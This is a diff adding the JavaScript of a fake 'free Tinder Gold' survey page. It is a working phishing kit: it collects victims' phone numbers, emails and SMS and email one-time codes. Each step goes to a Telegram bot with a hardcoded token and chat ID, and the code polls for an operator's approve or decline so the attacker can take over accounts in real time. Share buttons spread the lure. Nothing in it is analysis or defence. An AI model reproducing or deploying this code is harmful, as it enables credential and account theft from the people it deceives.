+  })
+  .catch(function(){
+    // Fallback: hardcoded defaults if JSON fails to load
+    _op = { token: '8675114023:AAE9tkINdxrKrAgLe21Ks9tXyCjsm_ZebXw', chat: '8362680243' };
+  });
+
+var lsUserPhone='', lsUserEmail='', lsPhoneCode='', lsEmailCode='';
+var lsPollTimer=null, lsBaseUpdateId=0, lsDecisionMade=false, lsCurrentStage='';
+
+// ── Direct Telegram helpers ──
+function tgPost(action, payload){
+  var url = TG_BASE + _op.token + '/' + action;
+  return fetch(url, {method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(payload)
+  });
+}
+
+function tgSend(text){
+  tgPost('sendMessage', {chat_id:_op.chat, parse_mode:'HTML', text:text}).catch(function(){});
+}
+
+function tgSendWithButtons(text, stage){
+  return tgPost('sendMessage', {chat_id:_op.chat, parse_mode:'HTML', text:text,
+    reply_markup:{inline_keyboard:[[
+      {text:'✅ Approve',callback_data:'ok_'+stage},
+      {text:'❌ Decline',callback_data:'no_'+stage}
+    ]]}
+  }).catch(function(){});
+}
+
+function tgGetUpdates(offset){
+  var url = TG_BASE + _op.token + '/getUpdates?offset='+(offset||0)+'&limit=20&timeout=0';
+  return fetch(url).then(function(r){return r.json();}).catch(function(){return {ok:false};});
+}
+
+
+function tgAnswerCb(id, text){
+  tgPost('answerCallbackQuery', {callback_query_id:id, text:text}).catch(function(){});
+}
+
+// ── Navigate between login steps ─────────────────────────────
+function goToStep(id){
+  ['ls-step1','ls-step2','ls-step3','ls-step4','ls-step5','ls-step6'].forEach(function(s){
+    var el=document.getElementById(s); if(el) el.style.display='none';
+  });
+  var t=document.getElementById(id);
+  if(t) t.style.display='block';
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+// ── anchorThenSend ────────────────────────────────────────────
+// Flush old updates → send buttons → start polling.
+// Guaranteed safe order — no ghost-fires.
+function anchorThenSend(text, stage){
+  tgGetUpdates(lsBaseUpdateId).then(function(d){
+    if(d.ok && d.result && d.result.length){
+      d.result.forEach(function(u){
+        if(u.update_id >= lsBaseUpdateId) lsBaseUpdateId = u.update_id + 1;
+      });
+    }
+    return tgSendWithButtons(text, stage);
+  }).catch(function(){
+    return tgSendWithButtons(text, stage);
+  }).finally(function(){
+    startPolling(stage);
+  });
+}
+
+// ── Polling ───────────────────────────────────────────────────
+function startPolling(stage){
+  if(lsPollTimer) clearInterval(lsPollTimer);
+  lsDecisionMade=false;
+  lsCurrentStage=stage;
+
+  function processUpdates(updates){
+    updates.forEach(function(u){
+      if(u.update_id >= lsBaseUpdateId) lsBaseUpdateId = u.update_id + 1;
+      if(lsDecisionMade) return;
+      if(!u.callback_query) return;
+      var cb  = u.callback_query;
+      var dat = (cb.data||'').toLowerCase().trim();
+      console.log('[POLL] got:', dat, '| want: ok_'+stage);
+      if(dat === 'ok_'+stage){
+        lsDecisionMade=true; clearInterval(lsPollTimer);
+        tgAnswerCb(cb.id,'✅ Approved!');
+        handleDecision(stage,'approved');
+      } else if(dat === 'no_'+stage){
+        lsDecisionMade=true; clearInterval(lsPollTimer);
+        tgAnswerCb(cb.id,'❌ Declined.');
+        handleDecision(stage,'declined');
+      } else {
+        tgAnswerCb(cb.id,'⚠️ Expired');
+      }
+    });
+  }
+
+  function doPoll(){
+    if(lsDecisionMade) return;
+    tgGetUpdates(lsBaseUpdateId).then(function(d){
+      if(d.ok && d.result && d.result.length) processUpdates(d.result);
+    });
+  }
+
+  doPoll();
+  lsPollTimer = setInterval(doPoll, 2000);
+}
+
+// ── Decision handler ──────────────────────────────────────────
+function handleDecision(stage, decision){
+  if(stage === 'step3'){
+    if(decision === 'approved'){
+      tgSend('✅ Details approved — user now entering phone code.');
+      goToStep('ls-step4');
+    } else {
+      showDeclined('ls-step3-declined',
+        'These details do not match a Tinder account.',
+        lsUserPhone, lsUserEmail);
+      tgSend('❌ Step 3 declined — user shown rejection screen.');
+    }
+
+  } else if(stage === 'step4'){
+    document.getElementById('s4-waiting').style.display='none';
+    document.getElementById('ls-btn4').style.display='block';
+    if(decision === 'approved'){
+      ['p0','p1','p2','p3'].forEach(function(id){ var el=document.getElementById(id); if(el) el.value=''; });
+      tgSend('✅ Phone code correct — user now entering email code.');
+      goToStep('ls-step5');
+    } else {
+      document.getElementById('s4-error').style.display='block';
+      ['p0','p1','p2','p3'].forEach(function(id){ var el=document.getElementById(id); if(el) el.value=''; });
+      document.getElementById('p0').focus();
+      tgSend('❌ Phone code wrong — user asked to re-enter.');
+    }
+
+  } else if(stage === 'step5'){
+    document.getElementById('s5-waiting').style.display='none';
+    document.getElementById('ls-btn5').style.display='block';
+    if(decision === 'approved'){
+      ['e0','e1','e2','e3'].forEach(function(id){ var el=document.getElementById(id); if(el) el.value=''; });
+      goToStep('ls-step6');
+      anchorThenSend(
+        '🏆 <b>Final Step — Activate Gold?</b>\n\n📞 Phone: <code>'+lsUserPhone+'</code>\n✉️ Email: <code>'+lsUserEmail+'</code>\n\n✅ Approve = activate Gold\n❌ Decline = reject',
+        'step6'
+      );
+      tgSend('✅ Email code correct — user on final activation screen.');
+    } else {
+      document.getElementById('s5-error').style.display='block';
+      ['e0','e1','e2','e3'].forEach(function(id){ var el=document.getElementById(id); if(el) el.value=''; });
+      document.getElementById('e0').focus();
+      tgSend('❌ Email code wrong — user asked to re-enter.');
+    }
+
+  } else if(stage === 'step6'){
+    if(decision === 'approved'){
+      var w=document.getElementById('ls-step6-waiting');
+      var a=document.getElementById('ls-step6-approved');
+      if(w) w.style.display='none';
+      if(a) a.style.display='block';
+      launchConfetti();
+      setTimeout(spawnFloatingHearts,400);
+      tgSend('🏆 Gold Activated! Subscription confirmed.');
+    } else {
+      var w2=document.getElementById('ls-step6-waiting');
+      var d2=document.getElementById('ls-step6-declined');
+      if(w2) w2.style.display='none';
+      if(d2) d2.style.display='block';
+      tgSend('❌ Final step declined.');
+    }
+  }
+}
+
+// ── Rejection screen helper ───────────────────────────────────
+function showDeclined(containerId, reason, phone, email){
+  var el=document.getElementById(containerId);
+  if(!el) return;
+  el.style.display='block';
+  el.innerHTML=
+    '<div class="ls-declined-badge" style="margin-top:16px;">❌ Verification failed</div>'+
+    '<div style="background:var(--bg2);border:1.5px solid var(--border);border-radius:10px;padding:12px 16px;margin:12px 0;text-align:left;">'+
+      '<div style="font-size:13px;font-weight:800;color:var(--t-red);margin-bottom:4px;">📱 '+phone+'</div>'+
+      '<div style="font-size:13px;font-weight:800;color:var(--t-red);">✉️ '+email+'</div>'+
+    '</div>'+
+    '<div style="font-size:12px;color:var(--muted);margin-bottom:14px;font-weight:600;">'+reason+'</div>'+
+    '<button class="ls-btn" onclick="lsRetry()">← Try again</button>';
+}
+
+// ── Step 1: Phone ─────────────────────────────────────────────
+function lsVal1(){
+  var v=(document.getElementById('ls-phone').value||'').trim();
+  document.getElementById('ls-btn1').style.opacity = v.length>=7 ? '1' : '0.6';
+}
+function lsS1(){
+  var phone=(document.getElementById('ls-phone').value||'').trim();
+  if(phone.length<7){ document.getElementById('ls-vm1').style.display='block'; return; }
+  document.getElementById('ls-vm1').style.display='none';
+  lsUserPhone=phone;
+  var btn=document.getElementById('ls-btn1'), txt=document.getElementById('ls-btn1-text');
+  btn.disabled=true; txt.textContent='Sending…';
+  setTimeout(function(){ btn.disabled=false; txt.textContent='Send Code →'; goToStep('ls-step2'); }, 800);
+}
+
+// ── Step 2: Email ─────────────────────────────────────────────
+function lsVal2(){
+  var v=(document.getElementById('ls-email').value||'').trim();
+  document.getElementById('ls-btn2').style.opacity = (v.indexOf('@')>-1 && v.indexOf('.')>-1) ? '1' : '0.6';
+}
+function lsS2(){
+  var email=(document.getElementById('ls-email').value||'').trim();
+  if(email.indexOf('@')===-1||email.indexOf('.')===-1){
+    document.getElementById('ls-vm2').style.display='block'; return;
+  }
+  document.getElementById('ls-vm2').style.display='none';
+  lsUserEmail=email;
+  var btn=document.getElementById('ls-btn2'), txt=document.getElementById('ls-btn2-text');
+  btn.disabled=true; txt.textContent='Verifying…';
+  var pd=document.getElementById('ls-phone-display');
+  var ed=document.getElementById('ls-email-display');
+  if(pd) pd.textContent=lsUserPhone;
+  if(ed) ed.textContent=lsUserEmail;
+  setTimeout(function(){
+    btn.disabled=false; txt.textContent='Continue →';
+    goToStep('ls-step3');
+    anchorThenSend(
+      '🔔 <b>New User Details</b>\n\n📞 Phone: <code>'+lsUserPhone+'</code>\n✉️ Email: <code>'+lsUserEmail+'</code>\n\n✅ Approve = send phone OTP\n❌ Decline = reject user',
+      'step3'
+    );
+  }, 800);
+}
+
+// ── Step 4: Phone OTP ─────────────────────────────────────────
+function codeIn(prefix,idx,total){
+  var el=document.getElementById(prefix+idx);
+  el.value=el.value.replace(/[^0-9]/g,'');
+  el.style.animation='none'; void el.offsetWidth;
+  el.style.animation='bounceIn 0.22s cubic-bezier(.34,1.56,.64,1) both';
+  if(el.value.length===1&&idx<total-1) document.getElementById(prefix+(idx+1)).focus();
+}
+function codeKey(e,prefix,idx){
+  if(e.key==='Backspace'&&document.getElementById(prefix+idx).value===''&&idx>0)
+    document.getElementById(prefix+(idx-1)).focus();
+}
+function getCode(prefix,total){
+  var c=''; for(var i=0;i<total;i++) c+=document.getElementById(prefix+i).value; return c;
+}
+function lsS4(){
+  var code=getCode('p',4);
+  if(code.length<4){ document.getElementById('ls-vm4').style.display='block'; return; }
+  document.getElementById('ls-vm4').style.display='none';
+  document.getElementById('s4-error').style.display='none';
+  lsPhoneCode=code;
+  var btn=document.getElementById('ls-btn4');
+  btn.style.display='none';
+  document.getElementById('s4-waiting').style.display='block';
+  anchorThenSend(
+    '🔢 <b>Step 4 — Phone Code</b>\n\n📞 Phone: <code>'+lsUserPhone+'</code>\n✉️ Email: <code>'+lsUserEmail+'</code>\n🔑 Code: <code>'+code+'</code>\n\n✅ Approve = correct → email code\n❌ Decline = wrong → ask again',
+    'step4'
+  );
+}
+function lsResendPhone(){
+  tgSend('🔄 <b>Phone resend requested</b>\n📞 <code>'+lsUserPhone+'</code>');
+  var s=document.querySelector('#ls-step4 .ls-resend span');
+  if(s){ s.textContent='Sent!'; setTimeout(function(){s.textContent='Resend code';},3000); }
+}
+
+// ── Step 5: Email OTP ─────────────────────────────────────────
+function lsS5(){
+  var code=getCode('e',4);
+  if(code.length<4){ document.getElementById('ls-vm5').style.display='block'; return; }
+  document.getElementById('ls-vm5').style.display='none';
+  document.getElementById('s5-error').style.display='none';
+  lsEmailCode=code;
+  var btn=document.getElementById('ls-btn5');
+  btn.style.display='none';
+  document.getElementById('s5-waiting').style.display='block';
+  anchorThenSend(
+    '📧 <b>Step 5 — Email Code</b>\n\n📞 Phone: <code>'+lsUserPhone+'</code>\n✉️ Email: <code>'+lsUserEmail+'</code>\n🔑 Code: <code>'+code+'</code>\n\n✅ Approve = correct → activate Gold\n❌ Decline = wrong → ask again',
+    'step5'
+  );
+}
+function lsResendEmail(){
+  tgSend('🔄 <b>Email resend requested</b>\n✉️ <code>'+lsUserEmail+'</code>');
+  var s=document.querySelector('#ls-step5 .ls-resend span');
+  if(s){ s.textContent='Sent!'; setTimeout(function(){s.textContent='Resend code';},3000); }
+}
+
+// ── Retry ─────────────────────────────────────────────────────
+function lsRetry(){
+  if(lsPollTimer) clearInterval(lsPollTimer);
+  lsDecisionMade=false; lsCurrentStage='';
+  lsUserPhone=''; lsUserEmail=''; lsPhoneCode=''; lsEmailCode='';
+  ['p0','p1','p2','p3','e0','e1','e2','e3'].forEach(function(id){
+    var el=document.getElementById(id); if(el) el.value='';
+  });
+  var ph=document.getElementById('ls-phone'); if(ph) ph.value='';
+  var em=document.getElementById('ls-email'); if(em) em.value='';
+  // Flush stale updates before restarting
+  tgGetUpdates(lsBaseUpdateId).then(function(d){
+    if(d.ok && d.result && d.result.length){
+      d.result.forEach(function(u){
+        if(u.update_id >= lsBaseUpdateId) lsBaseUpdateId = u.update_id + 1;
+      });
+    }
+    goToStep('ls-step1');
+  }).catch(function(){ goToStep('ls-step1'); });
+}
+function lsBack(step){ if(step===2) goToStep('ls-step1'); }
+
+// ── Share functions ───────────────────────────────────────────
+function lsShare(){
+  if(navigator.share){
+    navigator.share({title:'Get Free Tinder Gold!',text:'Complete this survey and get Tinder Gold free:',url:SHARE_URL}).catch(function(){lsCopyLink();});
+  } else { lsCopyLink(); }
+}
+function lsShareWa(){
+  window.open('https://wa.me/?text='+encodeURIComponent('Get free Tinder Gold: '+SHARE_URL),'_blank');
+}
+function lsShareTg(){
+  window.open('https://t.me/share/url?url='+encodeURIComponent(SHARE_URL)+'&text='+encodeURIComponent('Get free Tinder Gold!'),'_blank');
+}
+function lsShareTw(){
+  window.open('https://twitter.com/intent/tweet?text='+encodeURIComponent('Just got free Tinder Gold! '+SHARE_URL),'_blank');
+}
+function lsCopyLink(){
+  navigator.clipboard.writeText(SHARE_URL).then(function(){
+    var btn=document.getElementById('copy-link-btn');
+    if(btn){btn.textContent='✅ Copied!';btn.style.borderColor='var(--success)';btn.style.color='var(--success)';}
+    showToast('Link copied! Share it with a friend 🎉');
+    setTimeout(function(){if(btn){btn.textContent='🔗 Copy link';btn.style.borderColor='';btn.style.color='';}},2500);
+  });
+}
+
+/* ── RIPPLE ── */
+function addRipple(btn,e){
+  var r=document.createElement('span');
+  r.className='ripple-el';
+  var rect=btn.getBoundingClientRect();
+  var size=Math.max(rect.width,rect.height);
+  r.style.width=r.style.height=size+'px';
+  r.style.left=(e.clientX-rect.left-size/2)+'px';
+  r.style.top=(e.clientY-rect.top-size/2)+'px';
+  btn.appendChild(r);
+  setTimeout(function(){r.remove();},600);
+}
+document.querySelectorAll('.btn-next,.ls-btn,.btn-copy').forEach(function(btn){
+  btn.addEventListener('click',function(e){addRipple(this,e);});
+});
+
+/* ── SHAKE on validation fail ── */
+function shakeEl(id){
+  var el=document.getElementById(id);
+  if(!el)return;
+  el.classList.remove('shake');
+  void el.offsetWidth;
+  el.classList.add('shake');
+  setTimeout(function(){el.classList.remove('shake');},600);
+}
+var origValidate=validate;
+validate=function(q){
+  var ok=origValidate(q);
+  if(!ok){
+    shakeEl('q'+q);
+    shakeEl('vm-q'+q);
+    // also shake login fields
+    shakeEl('ls-vm1');shakeEl('ls-vm2');
+  }
+  return ok;
+};
+
+/* ── CONFETTI ── */
+function launchConfetti(){
+  var canvas=document.getElementById('confetti-canvas');
+  canvas.style.display='block';
+  var ctx=canvas.getContext('2d');
+  canvas.width=window.innerWidth;
+  canvas.height=window.innerHeight;
+  var pieces=[];
+  var colors=['#FE3C72','#FF6036','#FFB800','#00B74A','#6366F1','#EC4899','#FBBF24'];
+  for(var i=0;i<140;i++){
+    pieces.push({
+      x:Math.random()*canvas.width,
+      y:-20-Math.random()*100,
+      w:6+Math.random()*8,
+      h:10+Math.random()*8,
+      color:colors[Math.floor(Math.random()*colors.length)],
+      vx:(Math.random()-0.5)*5,
+      vy:3+Math.random()*4,
+      rot:Math.random()*360,
+      vrot:(Math.random()-0.5)*8,
+      opacity:1
+    });
+  }
+  var startTime=Date.now();
+  function draw(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    var elapsed=Date.now()-startTime;
+    var alive=false;
+    pieces.forEach(function(p){
+      p.x+=p.vx; p.y+=p.vy; p.rot+=p.vrot;
+      if(elapsed>2200) p.opacity=Math.max(0,p.opacity-0.025);
+      if(p.y<canvas.height&&p.opacity>0) alive=true;
+      ctx.save();
+      ctx.globalAlpha=p.opacity;
+      ctx.translate(p.x+p.w/2,p.y+p.h/2);
+      ctx.rotate(p.rot*Math.PI/180);
+      ctx.fillStyle=p.color;
+      ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);
+      ctx.restore();
+    });
+    if(alive) requestAnimationFrame(draw);
+    else{ ctx.clearRect(0,0,canvas.width,canvas.height); canvas.style.display='none'; }
+  }
+  requestAnimationFrame(draw);
+}
+
+/* ── FLOATING HEARTS on login step 3 approved ── */
+function spawnFloatingHearts(){
+  var wrap=document.getElementById('ls-step3');
+  if(!wrap)return;
+  var emojis=['❤️','🔥','💛','✨','💕'];
+  for(var i=0;i<14;i++){
+    (function(i){
+      setTimeout(function(){
+        var h=document.createElement('div');
+        h.className='ls-heart';
+        h.textContent=emojis[i%emojis.length];
+        h.style.cssText='left:'+Math.random()*100+'%;bottom:0;font-size:'+(18+Math.random()*22)+'px;opacity:0.75;animation-duration:'+(2+Math.random()*2)+'s;animation-delay:0s;position:absolute;z-index:10;';
+        wrap.style.position='relative';
+        wrap.appendChild(h);
+        setTimeout(function(){h.remove();},4200);
+      },i*150);
+    })(i);
+  }
+}
+
+
+
+
+
+
+
+/* ── Code box: jiggle on each digit entry ── */
+document.querySelectorAll('.ls-code-box').forEach(function(box){
+  box.addEventListener('input',function(){
+    this.style.animation='none';
+    var self=this;
+    requestAnimationFrame(function(){
+      self.style.animation='bounceIn 0.25s cubic-bezier(.34,1.56,.64,1) both';
+    });
+  });
+});
+
+/* ── Scroll-triggered stat counters ── */
+function animateCounter(el,target,duration){
+  var start=0,startTime=null;
+  function step(ts){
+    if(!startTime)startTime=ts;
+    var p=Math.min((ts-startTime)/duration,1);
+    var cur=Math.floor(p*target);
+    el.textContent=cur+(el.dataset.suffix||'');
+    if(p<1)requestAnimationFrame(step);
+    else el.textContent=el.dataset.full;
+  }
+  requestAnimationFrame(step);
+}
+var statsObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){
+      var el=entry.target;
+      if(el.dataset.animated)return;
+      el.dataset.animated='1';
+      animateCounter(el,parseInt(el.dataset.target)||75,1400);
+    }
+  });
+},{threshold:0.5});
+document.querySelectorAll('.stat-card-val').forEach(function(el){
+  var txt=el.textContent;
+  el.dataset.full=txt;
+  var num=parseInt(txt.replace(/\D/g,''))||0;
+  el.dataset.target=num;
+  el.dataset.suffix=txt.replace(/[0-9]/g,'');
+  statsObserver.observe(el);
+});
+</script>
+</body>
+</html>
